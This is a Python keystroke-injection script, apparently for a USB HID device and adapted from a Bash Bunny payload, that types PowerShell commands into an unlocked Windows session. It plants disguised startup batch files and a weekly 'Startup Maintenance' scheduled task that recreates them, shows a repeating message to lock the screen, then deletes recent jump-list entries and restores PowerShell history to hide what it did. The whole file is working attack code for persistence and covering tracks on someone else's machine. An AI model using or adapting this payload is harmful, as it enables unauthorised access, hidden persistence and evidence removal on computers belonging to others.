#!/usr/bin/env python3

# Adapted from a Bash Bunny payload by Neil Austin

from time import sleep
import KB0

KB0.tx(KB0._RUN)
sleep(.5)
KB0.TX("notepad.exe")
#KB0.TX("powershell")
KB0.tx(KB0._ENTER)
sleep(1)
KB0.TX("Copy-Item -Path \"C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\" -Destination \"C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt.bak\"")
KB0.tx(KB0._ENTER)
KB0.TX("CLEAR")
KB0.tx(KB0._ENTER)
KB0.TX("New-Item -Path \"C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" -Name \"WinMsgSvc.bat\" -ItemType \"file\" -Value \"@echo off`nCONSOLESTATE /Hide`nstart /min C:\\Users\\%USERNAME%\\AppData\\Roaming\\Roaming.bat`nexit\"")
KB0.tx(KB0._ENTER)
KB0.TX("CLEAR")
KB0.tx(KB0._ENTER)
KB0.TX("New-Item -Path \"C:\\Users\\$env:username\\AppData\Roaming\" -Name \"Roaming.bat\" -ItemType \"file\" -Value \"@echo off`nCONSOLESTATE /Hide`nSTART /B msg %USERNAME% /TIME:60 This message is a persistent reminder to always lock your screen or log out of your session before walking away. Unless you like surprises...`nexit\"")
KB0.tx(KB0._ENTER)
KB0.TX("CLEAR")
KB0.tx(KB0._ENTER)
KB0.TX("New-Item -Path \"C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\" -Name \"regen.bat\" -ItemType \"file\" -Value \"@echo off`nCONSOLESTATE /Hide`ncopy launcher.txt `\"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinMsgSvc.bat`\"`ncopy closer.txt `\"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Roaming.bat`\"`nexit\"")
KB0.tx(KB0._ENTER)
KB0.TX("CLEAR")
KB0.tx(KB0._ENTER)
KB0.TX("Copy-Item -Path \"C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinMsgSvc.bat\" -Destination \"C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\launcher.txt\"")
KB0.tx(KB0._ENTER)
KB0.TX("Copy-Item -Path \"C:\\Users\\$env:username\\AppData\\Roaming\\Roaming.bat\" -Destination \"C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\closer.txt\"")
KB0.tx(KB0._ENTER)
KB0.TX("CLEAR")
KB0.tx(KB0._ENTER)
KB0.TX("SCHTASKS /CREATE /SC WEEKLY /D FRI /TN \"Startup Maintenance\" /TR \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\regen.bat /min\" /ST 09:30")
KB0.tx(KB0._ENTER)
KB0.TX("y")
KB0.tx(KB0._ENTER)
KB0.TX("CLEAR")
KB0.tx(KB0._ENTER)
KB0.TX("Get-ChildItem $env:APPDATA\\Microsoft\\Windows\\Recent\\AutomaticDestinations -Recurse -Include *.automaticDestinations-ms | Where-Object { $_.LastWriteTime -GE (Get-Date).AddMinutes(-2) } | Remove-Item")
KB0.tx(KB0._ENTER)
KB0.TX("Copy-Item -Path \"C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt.bak\" -Destination \"C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"")
KB0.tx(KB0._ENTER)
KB0.TX("Remove-Item -Path \"C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt.bak\"")
KB0.tx(KB0._ENTER)
KB0.TX("CLEAR")
KB0.tx(KB0._ENTER)
KB0.TX("#                       __        ___           _   _       _   _     _    ___")
KB0.tx(KB0._ENTER)
KB0.TX("# _   ___      ___   _  \ \      / / |__   __ _| |_( )___  | |_| |__ (_)__|__ \\")
KB0.tx(KB0._ENTER)
KB0.TX("#| | | \ \ /\ / / | | |  \ \ /\ / /| '_ \ / _` | __|// __| | __| '_ \| / __|/ /")
KB0.tx(KB0._ENTER)
KB0.TX("#| |_| |\ V  V /| |_| |   \ V  V / | | | | (_| | |_  \__ \ | |_| | | | \__ \_|")
KB0.tx(KB0._ENTER)
KB0.TX("# \__,_| \_/\_/  \__,_|    \_/\_/  |_| |_|\__,_|\__| |___/  \__|_| |_|_|___(_)")
KB0.tx(KB0._ENTER)
KB0.TX("#")
KB0.tx(KB0._ENTER)
KB0.tx(KB0._CLOSEWINDOW)
